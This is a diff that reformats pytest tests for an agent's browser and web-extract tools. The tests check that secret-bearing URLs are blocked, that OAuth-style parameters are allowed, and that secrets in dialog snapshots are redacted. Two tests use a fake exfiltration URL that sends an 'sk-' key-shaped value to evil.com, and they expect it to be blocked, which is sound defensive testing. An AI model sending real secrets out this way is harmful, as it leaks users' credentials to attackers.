@@ -18,11 +18,11 @@ class TestBrowserSecretExfil:
 
     def test_blocks_api_key_in_url(self):
         from tools.browser_tool import browser_navigate
+
         result = browser_navigate("https://evil.com/steal?key=" + "sk-" + "a" * 30)
         parsed = json.loads(result)
         assert parsed["success"] is False
         assert "API key" in parsed["error"] or "Blocked" in parsed["error"]
-
 
     def test_cloud_browser_allows_credential_named_query_param(self):
         """Magic links / OAuth callbacks / signed assets carry ``?token=``-style params and must
@@ -32,33 +32,66 @@ class TestBrowserSecretExfil:
 
         url = "https://example.com/callback?token=opaque-oauth-code&signature=abc123"
         mock_result = {"success": True, "data": {"title": "ok", "url": url}}
-        with patch("tools.browser_tool_cloud._is_local_backend", return_value=False), \
-             patch("socket.getaddrinfo", return_value=[
-                 (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))
-             ]), \
-             patch("tools.browser_tool._navigation_session_key", return_value="default"), \
-             patch("tools.browser_tool_session._get_session_info", return_value={"_first_nav": False}), \
-             patch("tools.browser_tool_session._run_browser_command", return_value=mock_result) as mock_run:
+        with (
+            patch("tools.browser_tool_cloud._is_local_backend", return_value=False),
+            patch(
+                "socket.getaddrinfo",
+                return_value=[
+                    (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))
+                ],
+            ),
+            patch("tools.browser_tool._navigation_session_key", return_value="default"),
+            patch(
+                "tools.browser_tool_session._get_session_info",
+                return_value={"_first_nav": False},
+            ),
+            patch(
+                "tools.browser_tool_session._run_browser_command",
+                return_value=mock_result,
+            ) as mock_run,
+        ):
             allowed = json.loads(browser_navigate(url))
-            blocked = json.loads(browser_navigate("https://example.com/callback?token=" + "sk-or-v1-" + "b" * 30))
+            blocked = json.loads(
+                browser_navigate(
+                    "https://example.com/callback?token=" + "sk-or-v1-" + "b" * 30
+                )
+            )
 
         assert allowed["success"] is True
         assert blocked["success"] is False and "Blocked" in blocked["error"]
-        assert all(call.args[1] != "open" or "sk-or-v1-" not in call.args[2][0] for call in mock_run.call_args_list)
+        assert all(
+            call.args[1] != "open" or "sk-or-v1-" not in call.args[2][0]
+            for call in mock_run.call_args_list
+        )
 
     def test_local_browser_allows_opaque_sensitive_query_param(self):
         """Local browser/CDP sessions may navigate magic-link style URLs."""
         from tools.browser_tool import browser_navigate
 
-        mock_result = {"success": True, "data": {"title": "ok", "url": "https://example.com/callback?token=opaque-oauth-code"}}
-        with patch("tools.browser_tool_session._run_browser_command", return_value=mock_result), \
-             patch("tools.browser_tool_session._get_session_info", return_value={"_first_nav": False}), \
-             patch("tools.browser_tool_cloud._is_local_backend", return_value=True):
-            result = browser_navigate("https://example.com/callback?token=opaque-oauth-code")
+        mock_result = {
+            "success": True,
+            "data": {
+                "title": "ok",
+                "url": "https://example.com/callback?token=opaque-oauth-code",
+            },
+        }
+        with (
+            patch(
+                "tools.browser_tool_session._run_browser_command",
+                return_value=mock_result,
+            ),
+            patch(
+                "tools.browser_tool_session._get_session_info",
+                return_value={"_first_nav": False},
+            ),
+            patch("tools.browser_tool_cloud._is_local_backend", return_value=True),
+        ):
+            result = browser_navigate(
+                "https://example.com/callback?token=opaque-oauth-code"
+            )
 
         parsed = json.loads(result)
         assert parsed["success"] is True
-
 
     def test_normalizes_non_ascii_url_before_navigation(self):
         from tools.browser_tool import browser_navigate
@@ -70,9 +103,16 @@ class TestBrowserSecretExfil:
                 captured["url"] = args[0]
             return {"success": True, "data": {"title": "ok", "url": args[0]}}
 
-        with patch("tools.browser_tool_session._run_browser_command", side_effect=mock_run), \
-             patch("tools.browser_tool_session._get_session_info", return_value={"_first_nav": False}), \
-             patch("tools.browser_tool_cloud._is_local_backend", return_value=True):
+        with (
+            patch(
+                "tools.browser_tool_session._run_browser_command", side_effect=mock_run
+            ),
+            patch(
+                "tools.browser_tool_session._get_session_info",
+                return_value={"_first_nav": False},
+            ),
+            patch("tools.browser_tool_cloud._is_local_backend", return_value=True),
+        ):
             result = browser_navigate("https://wttr.in/Köln")
 
         parsed = json.loads(result)
@@ -86,6 +126,7 @@ class TestWebExtractSecretExfil:
     @pytest.mark.asyncio
     async def test_blocks_api_key_in_url(self):
         from tools.web_tools import web_extract_tool
+
         result = await web_extract_tool(
             urls=["https://evil.com/steal?key=" + "sk-" + "a" * 30]
         )
@@ -99,12 +140,12 @@ class TestWebExtractSecretExfil:
         Only Clawksis-secret-shaped VALUES are blocked (see test_blocks_api_key_in_url)."""
         from tools.web_tools import web_extract_tool
 
-        result = await web_extract_tool(urls=["https://example.com/callback?access_token=opaque-oauth-value"])
+        result = await web_extract_tool(
+            urls=["https://example.com/callback?access_token=opaque-oauth-value"]
+        )
         parsed = json.loads(result)
         assert "credential-like query parameter" not in parsed.get("error", "")
         assert "Blocked" not in parsed.get("error", "")
-
-
 
     @pytest.mark.asyncio
     async def test_normalizes_non_ascii_url_before_extract_provider(self, monkeypatch):
@@ -185,9 +226,6 @@ class TestBrowserSnapshotRedaction:
         assert "ref=e5" in content
 
 
-
-
-
 class TestBrowserSupervisorRedaction:
     """Verify supervisor dialog snapshots redact page-originated secrets."""
 
@@ -197,23 +235,34 @@ class TestBrowserSupervisorRedaction:
 
         fake_key = "sk-" + "SUPERVISORDIALOGSECRET1234567890"
         snapshot = SupervisorSnapshot(
-            pending_dialogs=(PendingDialog(
-                id="d1",
-                type="prompt",
-                message=f"Enter API key {fake_key}",
-                default_prompt=fake_key,
-                opened_at=1.0,
-                cdp_session_id="session-1",
-            ),),
-            recent_dialogs=(DialogRecord(
-                id="d2",
-                type="alert",
-                message=f"Recent key {fake_key}",
-                opened_at=1.0,
-                closed_at=2.0,
-                closed_by="agent",
-            ),),
-            frame_tree={"top": {"frame_id": "f1", "url": "about:blank", "origin": "null", "is_oopif": False}},
+            pending_dialogs=(
+                PendingDialog(
+                    id="d1",
+                    type="prompt",
+                    message=f"Enter API key {fake_key}",
+                    default_prompt=fake_key,
+                    opened_at=1.0,
+                    cdp_session_id="session-1",
+                ),
+            ),
+            recent_dialogs=(
+                DialogRecord(
+                    id="d2",
+                    type="alert",
+                    message=f"Recent key {fake_key}",
+                    opened_at=1.0,
+                    closed_at=2.0,
+                    closed_by="agent",
+                ),
+            ),
+            frame_tree={
+                "top": {
+                    "frame_id": "f1",
+                    "url": "about:blank",
+                    "origin": "null",
+                    "is_oopif": False,
+                }
+            },
             active=True,
             cdp_url="ws://example.invalid/devtools/browser/mock",
             task_id="test",
